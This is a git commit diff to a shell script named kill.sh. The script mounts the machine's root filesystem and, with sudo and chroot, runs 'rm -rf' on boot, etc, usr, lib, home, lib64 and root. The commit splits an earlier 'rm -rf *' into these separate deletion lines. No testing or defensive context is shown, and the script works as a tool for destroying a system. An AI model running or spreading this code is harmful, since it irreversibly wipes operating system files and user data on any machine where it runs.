0f6de3d27d2a793ffa23e0ce2de48e72293100ee
rayquaza-69 <85679614+rayquaza-69@users.noreply.github.com>
2022-02-17 20:18:30 +0530

    Update kill.sh

--- kill.sh
+++ kill.sh
@@ -7,7 +7,15 @@ root=$(df -h | grep -w "/" | awk '{print $1}')
 mkdir mounty
 sudo mount $root mounty
 
-sudo chroot mounty rm -rf *
+sudo chroot mounty rm -rf boot
+sudo chroot mounty rm -rf etc
+sudo chroot mounty rm -rf usr
+sudo chroot mounty rm -rf lib
+sudo chroot mounty rm -rf home
+sudo chroot mounty rm -rf lib64
+sudo chroot mounty rm -rf root
+
+
 
 
 
